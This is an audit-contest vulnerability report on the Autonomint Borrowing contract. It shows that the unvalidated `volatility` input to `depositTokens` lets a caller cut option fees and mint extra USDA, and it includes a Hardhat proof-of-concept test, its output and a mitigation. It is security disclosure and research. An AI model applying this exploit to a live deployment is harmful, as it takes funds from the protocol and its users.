# [H-4] Lack of checks for `ethVolatility` param inside `Borrowing::depositTokens` function allows users to mint more `USDA`

### Summary

The `Borrowing::depositTokens` function takes a `BorrowDepositParams` [struct](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/interface/IBorrowing.sol#L79) as input param from users that want to deposit assets and mint USDA. One important param that currently has no checks in place is `BorrowDepositParams::volatility`.

This param is taken by the `Borrowing::depositTokens` function and passed to the `BorrowingLib::deposit` function without any validation. Inside `BorrowingLib::deposit` we can see that this function passes the param further to the `Options::calculateOptionPrice` function without any validation.

```javascript
        uint256 optionFees = interfaces.options.calculateOptionPrice(
            libParams.ethPrice,
//@audit no validation
            params.volatility,
            params.depositingAmount,
            params.strikePercent
        );
```

This parameter is important because it is used directly when calculating `optionFees` inside `Options::calculateOptionPrice`. This param is part of the value passed to the `sqrt` function, as well as part of the `baseOptionPrice` and `optionPrice` [calculations](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/Options.sol#L110) as can be seen below.

```javascript
    function calculateOptionPrice(
//..
        uint256 _ethVolatility,
//..
    ) public view returns (uint256) {
//@audit _ethVolatility is used here
        uint256 a = _ethVolatility;

//..
//..
//@audit it is passed directly here without any checks and used to calculate the `baseOptionPrice`
        uint256 baseOptionPrice = ((sqrt(10 * a * ethPrice)) * PRECISION) / OPTION_PRICE_PRECISION + ((3 * PRECISION * OPTION_PRICE_PRECISION) / b); // 1e18 is used to handle division precision

//..
//..
//@audit it is then used to compute the `optionPrice` as well
        } else if (_strikePrice == StrikePrice.TWENTY_FIVE) {
            optionPrice = baseOptionPrice + (5 * OPTION_PRICE_PRECISION * baseOptionPrice) / (3 * a);
        }
//..
//..
    }

//@audit it is also part of `y` inside the `sqrt` function
    function sqrt(uint y) internal pure returns (uint z) {
//..
//..
}
```

This parameter will directly influence the amount of option fees that a user will pay because it is part of the `baseOptionPrice` calculation `uint256 baseOptionPrice = ((sqrt(10 * a * ethPrice))`. The `a` param is `_ethVolatility`. The lower the value of `a`, the lower the number passed to the `sqrt` function will be, and the lower the overall  `baseOptionPrice` will be. By manipulating its value, a user is able to mint more `USDA` by paying fewer `optionFees` to the protocol.

Although the contest's ReadMe states that `ethVolatility` will be part of the protocol's off-chain infrastructure and should be trusted, my issue is not with the UI. You can think of it as two different paths. The "happy path" is that users will call `Borrowing::depositTokens` through the UI. In this case, the `BorrowDepositParams::volatility` param will be provided by the protocol's off-chain infrastructure and should be trusted. However, there is no way to prevent users from calling the `Borrowing::depositTokens` functions directly on-chain. This is the second path and in this case, users are able to provide an arbitrary `volatility` param. This will allow them to bypass the UI and get "better deals" than what they are supposed to get by paying fewer fees to the protocol and minting more USDA.

### Root Cause

Lack of input validation for the `BorrowDepositParams::volatility` parameter.

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

**1. Direct on-chain call:** A user bypasses the trusted UI and directly calls the `Borrowing::depositTokens` function on-chain.

**2. Arbitrary `ethVolatility` input:** The attacker supplies a lower `ethVolatility` value than expected.

**3. Reduced `optionFees`:** The manipulated `ethVolatility` leads to lower `optionFees` during the `Options::calculateOptionPrice` function.

**4. Excessive `USDA` minting:** Lower `optionFees` allow the user to mint more `USDA` for the same deposit amount, effectively obtaining "better deals" than intended and causing loss of funds for the protocol.

### Impact

- Loss of funds for the protocol. The protocol receives fewer fees than expected, because `ethVolatility` is used directly in the math that's behind the `optionPrice` computation.
- User inflates their `USDA` minted amount. The user gets more `USDA` at the expense of the protocol. Every dollar not paid in `optionFees` turns into an extra `USDA` for the user.

### PoC

Put the following test inside the `BorrowingTest.ts` file.
My test involves two users.  You can read the test like this: "user1 uses the UI with `ethVolatility` provided by the protocol" while "user2 calls the function with arbitrary `ethVolatility`". Check their `depositParamArray's`. User 2 will have a hardcoded `ethVolatility` value that is different than the one provided by the developer in the test files.

```javascript
    it.only("Should mint more tokens with different ethVolatility", async function () {
      const {
        BorrowingContractA,
        CDSContractA,
        usdtA,
        globalVariablesA,
        TokenA, // The USDA token
        wrsETHA, // The wrsETH token
        user1,
        user2,
      } = await loadFixture(deployer);

      //mint USDT and deposit it into the CDS
      await usdtA.connect(user1).mint(user1.getAddress(), 20000000000);
      await usdtA.connect(user1).approve(CDSContractA.getAddress(), 20000000000);
      const options = Options.newOptions().addExecutorLzReceiveOption(400000, 0).toHex().toString();

      let nativeFee = 0;
      [nativeFee] = await globalVariablesA.quote(1, 1, options, false);
      await CDSContractA.connect(user1).deposit(20000000000, 0, true, 20000000000, 100000, {
        value: nativeFee.toString(),
      });

      const wrsETHpriceBefore = await BorrowingContractA.getUSDValue(await wrsETHA.getAddress());
      console.log("wrsETH price before deposit is:", wrsETHpriceBefore);

      const user1BalanceBefore = await TokenA.balanceOf(user1.getAddress());
      console.log("User USDA balance before deposit:", user1BalanceBefore);

      const user2BalanceBefore = await TokenA.balanceOf(user2.getAddress());
      console.log("User USDA balance before deposit:", user2BalanceBefore);

      // Approve wrsETH for deposit user 1
      await wrsETHA.connect(user1).mint(user1.getAddress(), ethers.parseEther("10")); // user2 has 10 wrsETH
      await wrsETHA.connect(user1).approve(BorrowingContractA.getAddress(), ethers.parseEther("10"));

      // Approve wrsETH for deposit user 2
      await wrsETHA.connect(user2).mint(user2.getAddress(), ethers.parseEther("10")); // user2 has 10 wrsETH
      await wrsETHA.connect(user2).approve(BorrowingContractA.getAddress(), ethers.parseEther("10"));

      //set deposit params user1 with ethVolatility provided by the developer const ethVolatility = 50622665;
      const depositParamArray1 = [1, 110000, ethVolatility, 3, ethers.parseEther("10")];

      //set deposit params user2 with ethVolatility set at an arbitrary value
      const depositParamArray2 = [1, 110000, 10000000, 3, ethers.parseEther("10")];

      // deposit tokens user1
      await BorrowingContractA.connect(user1).depositTokens(100000, await time.latest(), depositParamArray1, {
        value: BigInt(nativeFee),
      });

      // deposit tokens user2
      await BorrowingContractA.connect(user2).depositTokens(100000, await time.latest(), depositParamArray2, {
        value: BigInt(nativeFee),
      });

      // Check how many USDA minted after deposit
      let user1BalanceAfter = await TokenA.balanceOf(user1.getAddress());
      console.log("User1 USDA balance after deposit:", user1BalanceAfter);

      let user2BalanceAfter = await TokenA.balanceOf(user2.getAddress());
      console.log("User2 USDA balance after deposit:", user2BalanceAfter);

      const user1MintedDecimals = Number(user1BalanceAfter) / 1e6;
      console.log("User1 net minted USDA for depositing 10 wrsETH:", user1MintedDecimals);

      const user2MintedDecimals = Number(user2BalanceAfter) / 1e6;
      console.log("User2 net minted USDA for depositing 10 wrsETH:", user2MintedDecimals);
    });
```

Test output

```javascript
wrsETH price before deposit is: Result(2) [ 1030328449196685448n, 326676n ]
User USDA balance before deposit: 0n
User USDA balance before deposit: 0n
User1 USDA balance after deposit: 7444310267n
User2 USDA balance after deposit: 7765739810n
User1 net minted USDA for depositing 10 wrsETH: 7444.310267
User2 net minted USDA for depositing 10 wrsETH: 7765.73981
  âœ” Should mint more tokens with different ethVolatility (28032ms)

  1 passing (28s)
```

As can be seen above, both users deposited 10 `wrsETH`. User1 got `7444 USDA`, while User2 got `7765 USDA`. The difference may not seem "that big" because there is another bug in the code that returns such low amounts, but this is out of the scope of this report. If the code would be fixed, the difference would be even bigger.

**I'll try to quickly explain what I mean by that**
We just deposited $32660 into the protocol but received below $8000 USDA in both cases. Normally, the protocol is supposed to return a `LTV` of 80%. Considering that in my PoC, `ethPrice` was `$3266` and we deposited `10ether`, normally we were supposed to get `$26128` (80% out of 32660) minus some `optionFees`. In order to get a better picture of the actual impact while maintaining simplicity, let's assume that the code is fixed and users will actually get 80% LTV minus some `optionFees`. Multiply the test results by 3 to get a more accurate figure of the actual impact (still not 100% accurate, but a lot closer to reality).

That would looks like this:
- $22332 `USDA` minted for user1, which used the protocol's UI with expected `ethVolatility`. In this case the protocol received $3796 optionFees ($26128 - $22332).
- $23295 `USDA` minted for user2, which used a lower arbitrary value for `ethVolatility` and called the contract directly on-chain. In this case, the protocol received $2833 `optionFees` ($26128 - $23295).

The 2nd user paid $963 less in `optionFees` and minted 963 more `USDA`. That's a ~3% loss for the protocol in `optionFees` that turned into `USDA` gains for user2.

### Mitigation

Add checks for the `ethVolatility` parameter on the deposit flow. The most straightforward approach that I can think of is to add a new storage variable in the `Borrowing` contract (say ethVol), create a setter function with `onlyAdmin/onlyOwner` modifier that allows the admin to set the value of `ethVol` to whatever value matches the expected value from the UI, and then add a check inside `Borrowing::depositTokens` function and make sure that the input param `volatility` matches the expected `ethVol`.
